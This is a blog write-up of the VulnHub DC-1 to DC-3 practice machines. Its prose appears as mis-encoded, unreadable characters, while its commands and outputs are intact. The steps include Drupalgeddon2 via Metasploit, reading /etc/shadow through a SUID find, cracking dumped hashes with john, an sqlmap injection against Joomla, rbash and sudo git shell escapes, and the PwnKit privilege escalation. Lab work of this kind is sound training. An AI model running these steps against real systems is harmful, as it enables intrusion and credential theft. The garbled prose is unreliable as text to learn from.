+++
title = "DC 1-3 Writeup"
author = ["4shen0ne"]
publishDate = 2024-12-26T00:00:00+08:00
tags = ["writeup", "vulnhub"]
draft = false
+++

[ã€Œ DC ã€æ˜¯ vulnhub ä¸Šçš„ç³»åˆ—é¶æœº](https://www.vulnhub.com/series/dc,199/)ï¼Œå› ä¸ºå‚åŠ çš„æŸä¸ªåŸ¹è®­è¯¾ç¨‹ç”¨ DC1-3 è¿™ä¸‰ä¸ªç¯å¢ƒä½œä¸ºç»ƒä¹ é¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹

<!--more-->


## ç½‘ç»œè®¾ç½® {#ç½‘ç»œè®¾ç½®}

é¶æœºä½¿ç”¨çš„æ˜¯é™æ€ IP åœ°å€å’Œè™šæ‹Ÿæœºçš„ã€Œæ¡¥æ¥ç½‘ç»œã€æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¼šæŠŠå®¿ä¸»æœºæ‰€åœ¨ç½‘æ®µçš„ IP åˆ†é…ç»™è™šæ‹Ÿæœºï¼Œè€Œå®¿ä¸»æœºæ‰€åœ¨çš„ç½‘æ®µæœªå¿…å’Œé¶æœºè®¾ç½®çš„é™æ€ç½‘æ®µç›¸åŒï¼Œè¿™å°±å¯¼è‡´ç½‘å¡æ— æ³•æ­£å¸¸å¯åŠ¨

é‚£ä¹ˆé¦–å…ˆè¦è¿›å…¥ç³»ç»Ÿä¿®æ”¹ /etc/network/interfaces æ–‡ä»¶ï¼Œæ”¹æˆ DHCP çš„æ–¹å¼è·å– IPã€‚å› ä¸ºé¶æœºæ²¡æœ‰æä¾›ç³»ç»Ÿç”¨æˆ·å¯†ç ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ [GRUB](https://zh.wikipedia.org/zh-cn/GNU_GRUB) çš„å¯åŠ¨å‚æ•°è¿›å…¥ç³»ç»Ÿ[^fn:1]

ä»¥é¶æœºçš„ Debian ç³»ç»Ÿä¸ºä¾‹ï¼ˆå…¶ä»–ç³»ç»Ÿä¼šæœ‰åŒºåˆ«ï¼‰ï¼Œè¿›å…¥å¯åŠ¨èœå•åæŒ‰ e ç¼–è¾‘

{{< figure src="/ox-hugo/_20241225_234416screenshot.png" >}}

æ‰¾åˆ° roï¼ˆ read-only ï¼‰ï¼Œæ”¹æˆã€Œå¯å†™ã€æƒé™å¹¶æŒ‡å®šå¯åŠ¨ shell

```text
rw signie init=/bin/bash
```

{{< figure src="/ox-hugo/_20241225_234645screenshot.png" >}}

{{< figure src="/ox-hugo/_20241225_234718screenshot.png" >}}

è¿›å…¥ç³»ç»Ÿåç¼–è¾‘ /etc/network/interfacesï¼ŒæŠŠ eth0 ç½‘å¡æ”¹æˆ DHCP

```text
allow-hotplug eth0
iface eth0 inet dhcp
```

è‡ªåŠ¨è·å– IP

```text
dhclient eth0
```

ç„¶åé‡å¯


## DC-1 {#dc-1}

`nmap -sV` æ”¶é›†ç«¯å£ä¿¡æ¯

```text
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

80 ç«¯å£æ˜¯ Drupal CMSï¼Œåº”è¯¥æ˜¯ CVE-2018-7600 ä½†æ˜¯æˆ‘ç”¨ nuclei æ²¡æ‰«å‡ºæ¥ğŸ¤”

ç”¨ metasploit çš„ drupal_drupalgeddon2 æ¨¡å—ç›´æ¥æ‹¿åˆ° shell

```shell
use unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.124.5
run
...
meterpreter > shell -it
```

ç½‘ç«™æ ¹ç›®å½• flag1.txt ä¸­æœ‰æç¤º

```text
Every good CMS needs a config file - and so do you.
```

æ ¹æ®æç¤ºæœä¸€ä¸‹é…ç½®æ–‡ä»¶

```shell
find . -name settings*
# ./sites/default/settings.php
```

```text
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  settings.php
</div>

å°è¯•ç™»å½• mysqlï¼Œæ³¨æ„ `-p` å‚æ•°å’Œå¯†ç é—´[ä¸è¦æœ‰ç©ºæ ¼](https://jacobtomlinson.dev/posts/2013/why-is-there-no-space-in-the-mysql-password-parameter/)

```text
mysql -udbuser -pR0ck3t
```

åœ¨ drupaldb.users è¡¨é‡Œæ‰¾åˆ°ä¸‰ä¸ªç”¨æˆ·ï¼Œå¯†ç éƒ½æ˜¯ç»è¿‡åŠ å¯†çš„

| name  | pass                                                    |
|-------|---------------------------------------------------------|
| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
| test  | $S$DTwWb.MjZ8ihU.gMo1vZu32NCKL5p6YJpDVqgorKBibR/bdHK6/k |

ç›´æ¥ç ´è§£å¯†æ–‡æ¯”è¾ƒéš¾ï¼Œè€Œä¸”å®˜æ–¹æä¾›äº†å¯†ç çš„åŠ å¯†è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬åŠ å¯†ä¸€ä¸ªæ–°å¯†ç æ›¿æ¢ admin çš„åŸå¯†ç [^fn:2]

```text
www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 1234

password: 1234          hash: $S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK
```

```text
mysql> update drupaldb.users set pass='$S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK' where name='admin';
```

ä¿®æ”¹å¯†ç åç™»å½•åå°ï¼Œåœ¨ Content é¡µæ‰¾åˆ° flag3ï¼Œåˆæ˜¯æ–°çš„æç¤º

```text
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

è¿™é‡Œ PERMS å’Œ FIND ä¸¤ä¸ªå¤§å†™å•è¯ç»™äº†æç¤ºï¼Œåº”è¯¥æ˜¯ç”¨ find çš„ SUID ææƒè¯»å– shadow æ–‡ä»¶å†…å®¹

<details>
<summary>find . -exec cat /etc/shadow \; -quit</summary>
<div class="details">

```text
root:$6$91zYUPrB$A/i0KqmGAi.forD5idrSFrDlPGLDoHr33g0gTfW8oJsCBptPsNRNoc0XoqkCwvFU4XMqrocm4KYtPBLqorFpW0:19823:0:99999:7:::
daemon:*:17946:0:99999:7:::
bin:*:17946:0:99999:7:::
sys:*:17946:0:99999:7:::
sync:*:17946:0:99999:7:::
games:*:17946:0:99999:7:::
man:*:17946:0:99999:7:::
lp:*:17946:0:99999:7:::
mail:*:17946:0:99999:7:::
news:*:17946:0:99999:7:::
uucp:*:17946:0:99999:7:::
proxy:*:17946:0:99999:7:::
www-data:*:17946:0:99999:7:::
backup:*:17946:0:99999:7:::
list:*:17946:0:99999:7:::
irc:*:17946:0:99999:7:::
gnats:*:17946:0:99999:7:::
nobody:*:17946:0:99999:7:::
libuuid:!:17946:0:99999:7:::
Debian-exim:!:17946:0:99999:7:::
statd:*:17946:0:99999:7:::
messagebus:*:17946:0:99999:7:::
sshd:*:17946:0:99999:7:::
mysql:!:17946:0:99999:7:::
flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
```
</div>
</details>

æ‹¿åˆ° shadow çš„å†…å®¹åç›´æ¥ç»™ john ç ´è§£å¾—åˆ°å¼±å£ä»¤

```text
â¯ john dc1-shadow
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
123456           (root)
orange           (flag4)
```

å…ˆ ssh ç™»å½• rootï¼Œç„¶åæ‰¾åˆ° /root/thefinalflag.txt

```text
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

å•Šï¼Ÿé€šå…³äº†ï¼Ÿé‚£ flag4 æ˜¯å•¥ï¼Ÿ

ç™»å½• flag4 æœ‰ä¸ªæç¤º /home/flag4/flag4.txt ğŸ¤”

```text
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```


## DC-2 {#dc-2}

nmap æ‰«ä¸€ä¸‹åªæ‰«åˆ° 80 ç«¯å£ï¼Œç›´æ¥ç”¨ IP è®¿é—®ä¼šè¢«é‡å®šå‘åˆ° `http://dc-2/` ï¼Œéœ€è¦ä¿®æ”¹ hosts æ–‡ä»¶

è¿›å»åçŸ¥é“è¿™æ˜¯ä¸ª WordPress ç«™ç‚¹ï¼Œå¹¶ä¸”æ‰¾åˆ°ç¬¬ä¸€ä¸ªæç¤ºï¼ˆflag 1ï¼‰

{{< figure src="/ox-hugo/_20241226_092122screenshot.png" >}}

~~é¦–å…ˆ nuclei æ‰«ä¸€ä¸‹ WordPressï¼Œç”¨ wpscan ä¹Ÿè¡Œï¼Œä½†æ˜¯ arch æºä»“åº“çš„ wpscan è²Œä¼¼[å‡ºäº†ä¸ª bug](https://gitlab.archlinux.org/archlinux/packaging/packages/wpscan/-/issues/2)~~

{{< figure src="/ox-hugo/_20241226_092508screenshot.png" >}}

è¿˜æ˜¯ç”¨ wpscan æ‰«æ¯”è¾ƒå¥½ï¼Œnuclei ç€é‡æ¼æ´ã€Œæ£€æµ‹ã€è€Œä¸æ˜¯ã€Œåˆ©ç”¨ã€ï¼Œæ‰«å‡ºæ¥çš„ç”¨æˆ·åä¸å…¨

<div class="notes">

å¦‚ä½•ä½ å’Œæˆ‘ä¸€æ ·ç”¨çš„æ˜¯ Arch ç³»ç»Ÿï¼Œä»æºä»“åº“ä¸‹è½½çš„ wpscan å¯èƒ½ä¼šå‡ºç°é”™è¯¯

```text
cannot load such file -- ffi_c
```

ç›´æ¥ç”¨ gemï¼ˆruby çš„åŒ…ç®¡ç†å™¨ï¼‰æ¥ä¸‹è½½å°±æ²¡é—®é¢˜äº†

```text
gem install wpscan
```

</div>

```text
wpscan --url http://dc-2 -e
```

{{< figure src="/ox-hugo/_20241226_102417screenshot.png" >}}

æ‰«å‡ºæ¥ä¸€ä¸ªç™»å½•é¡µå’Œç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œå†è”ç³»åˆ° flag1 æç¤ºçš„ [cewl](https://github.com/digininja/CeWL) æ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·ï¼Œæ‰€ä»¥å°è¯•å¯¹æšä¸¾å‡ºæ¥çš„ç”¨æˆ·åè¿›è¡Œæš´åŠ›ç ´è§£

å…ˆæ„å»ºä¸€ä¸ªå¯†ç å­—å…¸ï¼Œç„¶åç»“åˆ wpscan æ‰«å‡ºæ¥çš„ç”¨æˆ·åæš´åŠ›ç ´è§£

```shell
cewl -w pass.txt http://dc-2
wpscan --url http://dc-2 -U admin,jerry,tom -P pass.txt
```

tom å’Œ jerry éƒ½æ‰«å‡ºæ¥äº†å¼±å£ä»¤

{{< figure src="/ox-hugo/_20241226_102937screenshot.png" >}}

ç™»å½•è¿›å»æ‰¾åˆ°æ–°æç¤ºï¼Œä¼¼ä¹ WordPress è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ï¼Œå¾—å¦è¾Ÿè¹Šå¾„

{{< figure src="/ox-hugo/_20241226_094429screenshot.png" >}}

å‘ç°ä¸€å¼€å§‹ç”¨ nmap çš„é»˜è®¤å‚æ•°æ‰«ç«¯å£æ¼äº†ä¸€ä¸ªï¼Œåº”è¯¥æ‰«å…¨ç«¯å£çš„ğŸ˜…

| PORT     | STATE | SERVICE | VERSION                                      |
|----------|-------|---------|----------------------------------------------|
| 80/tcp   | open  | http    | Apache httpd 2.4.10 ((Debian))               |
| 7744/tcp | open  | ssh     | OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) |

å°è¯•ä¸€ä¸‹å‘ç° tom çš„ wordpress å¯†ç å’Œ ssh å¯†ç ç›¸åŒï¼Œç›´æ¥ç™»å½•

```text
ssh tom@dc-2 -p 7744
```

å‘ç° shell æ˜¯ [rbash](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)ï¼Œå¾ˆå¤šå‘½ä»¤æ— æ³•ä½¿ç”¨ï¼Œå¯ä»¥ç”¨ `compgen -c` çœ‹çœ‹å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤æœ‰å“ªäº›

çœ‹åˆ°å¯ä»¥è¿è¡Œ viï¼ˆå…¶å®è¿è¡Œçš„æ˜¯ vimï¼‰é‚£ä¹ˆå‚è€ƒ [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) è¿›è¡Œææƒ

```text
vi --cmd ':set shell=/bin/bash|:shell'
```

ä¹‹åå†æ‰§è¡Œå‘½ä»¤ä¼šæ˜¾ç¤º `command not found` ä½†å…¶å®å·²ç»æ‹¿åˆ°åŠŸèƒ½å®Œæ•´çš„ bash shell äº†ï¼Œæ›´æ–°ä¸€ä¸‹ PATH ç¯å¢ƒå˜é‡å³å¯æ‰§è¡Œå¸¸ç”¨å‘½ä»¤

```shell
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
cat flag3.txt
# Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

æ ¹æ® flag3 çš„æç¤ºä½¿ç”¨ su åˆ‡æ¢åˆ° jerry ç”¨æˆ·ï¼Œå¯†ç æ˜¯ä¹‹å‰æ‰«å‡ºæ¥çš„ wordpress å¯†ç ï¼Œè¯»åˆ° flag4ï¼ˆtom ä¹Ÿèƒ½è¯»åˆ°ï¼‰

```shell
cat /home/jerry/flag4.txt
# Good to see that you've made it this far - but you're not home yet.
# You still need to get the final flag (the only flag that really counts!!!).
# No hints here - you're on your own now.  :-)
# Go on - git outta here!!!!
```

è¿˜æœ‰æœ€åä¸€ä¸ª flagï¼Œè€Œä¸”æç¤ºäº† gitï¼Œè‡ªç„¶æƒ³åˆ°[åˆ©ç”¨ git ææƒ](https://gtfobins.github.io/gtfobins/git/)

é¦–å…ˆæ£€æŸ¥ä¸€ä¸‹ jerry çš„ sudo åˆ—è¡¨ï¼Œå¯ä»¥æ‰§è¡Œ gitï¼ˆtom æ²¡æœ‰ sudo æƒé™ï¼‰

```shell
sudo -l
# User jerry may run the following commands on DC-2:
#     (root) NOPASSWD: /usr/bin/git
```

è™½ç„¶ä¸å…è®¸è®¾ç½® PAGER ç¯å¢ƒå˜é‡ï¼Œä½†å¯ä»¥å…ˆè¿›å…¥é»˜è®¤ pager å†æ‰§è¡Œå‘½ä»¤

```shell
sudo git -p help config
!/bin/bash
```

<details>
<summary>cat /root/final-flag.txt</summary>
<div class="details">

```text
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
</div>
</details>


## DC-3 {#dc-3}

å…ˆæ‰«ä¸€ä¸‹å…¨ç«¯å£ï¼Œè¿™æ¬¡ç¡®å®šåªæœ‰ä¸€ä¸ª 80ï¼Œæ˜¯ä¸€ä¸ª Joomla ç«™ç‚¹

{{< figure src="/ox-hugo/_20241226_145848screenshot.png" >}}

nuclei ç›´æ¥æ‰«å‡ºæ¥åå°å’Œ CVE-2017-8917

{{< figure src="/ox-hugo/_20241226_145936screenshot.png" >}}

ç”¨ sqlmap ç¿»ä¸€ä¸‹æ•°æ®åº“ï¼Œæ‰¾åˆ° admin çš„ç”¨æˆ·åå¯†ç 

```shell
sqlmap -u http://192.168.220.165/index.php\?option\=com_fields\&view\=fields\&layout\=modal\&list\[fullordering\]\=x\* -D joomladb -T '#__users' -C name,username,password --dump --batch
```

{{< figure src="/ox-hugo/_20241226_153054screenshot.png" >}}

Joomla çš„å¯†ç ç”¨ bcrypt åŠ å¯†è¿‡ï¼Œä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯åƒå‰é¢ DC-1 ä¸€æ ·ä¿®æ”¹ admin çš„å¯†ç ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¡¨åæœ‰ç‰¹æ®Šç¬¦å·çš„é—®é¢˜ï¼Œç”¨ sqlmap ä¸€ç›´æ²¡æœ‰ä¿®æ”¹æˆåŠŸã€‚ç„¶åæ”¹ç”¨ john ç ´è§£å‡ºå¯†ç ä¸º snoopy

```text
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > pass && john pass
```

æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç åç™»å½• joomla åå°ï¼Œå¯ä»¥ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶ï¼Œé€šè¿‡ PHP åå¼¹ shell[^fn:3]

{{< figure src="/ox-hugo/_20241226_194826screenshot.png" >}}

è®¿é—® /templates/beez3/error.php é¡µé¢è§¦å‘ï¼Œæ‹¿åˆ° www-data ç”¨æˆ·æƒé™çš„ shell

ä¸‹ä¸€æ­¥æ˜¯ææƒï¼ŒæŠŠ [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) è„šæœ¬ä¼ ä¸Šå»æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°ä¸å°‘ææƒé£é™©ç‚¹ï¼Œæˆ‘è¿™è¾¹ç”¨äº† [PwnKit](https://github.com/berdav/CVE-2021-4034)

{{< figure src="/ox-hugo/_20241226_195428screenshot.png" >}}

éœ€è¦æŠŠ poc æºç ä¼ åˆ°é¶æœºä¸Šé¢ç¼–è¯‘ï¼Œä¸ç„¶å¯èƒ½å› ä¸º CPU æ¶æ„ä¸åŒæ‰§è¡Œä¸äº†ã€‚ææƒæˆåŠŸåæ‹¿åˆ° root ç”¨æˆ·ç›®å½•ä¸‹çš„ flag

{{< figure src="/ox-hugo/_20241226_195938screenshot.png" >}}

[^fn:1]: <https://blog.csdn.net/qq_45290991/article/details/114189156>
[^fn:2]: <https://drupalchina.cn/node/2128>
[^fn:3]: <https://www.leavesongs.com/PHP/backshell-via-php.html>
